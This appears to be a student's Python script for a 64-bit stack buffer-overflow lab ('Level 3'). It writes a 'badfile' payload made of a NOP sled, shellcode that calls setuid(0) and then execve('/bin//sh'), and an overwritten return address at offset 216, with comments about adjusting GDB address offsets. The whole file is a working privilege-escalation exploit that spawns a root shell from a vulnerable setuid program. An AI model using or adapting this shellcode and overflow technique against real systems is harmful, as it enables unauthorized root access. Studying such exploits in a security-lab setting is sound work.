#!/usr/bin/python3
import sys

shellcode = (
    "\x48\x31\xff"              # xor rdi, rdi
    "\x48\x31\xc0"              # xor rax, rax
    "\xb0\x69"                  # mov al, 0x69
    "\x0f\x05"                  # syscall (setuid)
    "\x48\x31\xd2"              # xor rdx, rdx
    "\x52"                      # push rdx
    "\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68"  # mov rax, '/bin//sh'
    "\x50"                      # push rax
    "\x48\x89\xe7"              # mov rdi, rsp
    "\x52"                      # push rdx
    "\x57"                      # push rdi
    "\x48\x89\xe6"              # mov rsi, rsp
    "\x48\x31\xc0"              # xor rax, rax
    "\xb0\x3b"                  # mov al, 0x3b
    "\x0f\x05"                  # syscall (execve)
).encode('latin-1')

content = bytearray(0x90 for i in range(517))

# Place shellcode at offset 300
start = 300
content[start:start + len(shellcode)] = shellcode

# Try a much larger offset - GDB difference is bigger on 64-bit
# Try increments: 0x240, 0x260, 0x280, 0x2a0, 0x2c0, 0x2e0, 0x300
ret = 0x7fffffffd880 + 0x280  # Try 0x7fffffffdb00

offset = 216
L = 8
content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')

with open('badfile', 'wb') as f:
    f.write(content)

print("="*60)
print("Level 3 (64-bit) Exploit Created!")
print(f"Buffer (GDB):            0x7fffffffd880")
print(f"Shellcode at offset:     {start}")
print(f"Shellcode length:        {len(shellcode)} bytes")
print(f"Return address at:       offset {offset}")
print(f"Return address points:   0x{ret:016x}")
print(f"Expected shellcode at:   0x{0x7fffffffd880 + start:016x}")
print("="*60)